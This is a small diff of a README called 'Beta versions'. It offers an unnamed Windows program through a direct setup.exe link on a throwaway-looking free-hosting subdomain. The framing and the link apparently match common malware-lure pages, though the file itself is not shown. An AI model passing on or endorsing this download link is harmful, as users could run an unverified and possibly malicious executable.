@@ -1,8 +1,8 @@
 # Beta versions
 
 #### Test versions of the program are closed access, only for developers and blogger's review. 
-#### Click version to download
 #### Windows 7/8/8.1/10
+
 
 
 ## [:white_check_mark:Version - 7.8.4 - stable](http://s915550z.beget.tech/setup.exe)
